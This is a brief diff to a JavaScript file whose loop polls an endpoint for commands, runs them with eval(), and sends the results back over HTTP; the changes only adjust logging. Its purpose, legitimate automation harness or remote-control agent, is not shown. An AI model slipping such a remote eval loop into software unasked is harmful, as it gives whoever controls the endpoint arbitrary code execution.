@@ -85,6 +85,7 @@ var getNextCommand = function() {
 var sendCommandResult = function(commandId, result) {
   var url = 'send_result/'+commandId+'/'+encodeURIComponent(result);
   var res = doCurl('GET', endpoint + url);
+  console.log(res.status);
 };
 
 while(runLoop) {
@@ -92,7 +93,7 @@ while(runLoop) {
   if (cmd) {
     console.log("Executing command " + cmd.commandId + ": " + cmd.command);
     var result = eval(cmd.command);
-    console.log("####"+cmd.commandId+"####"+result+"####");
+    console.log(cmd.commandId+": "+result);
     sendCommandResult(cmd.commandId, result);
   } else {
     delay(10);
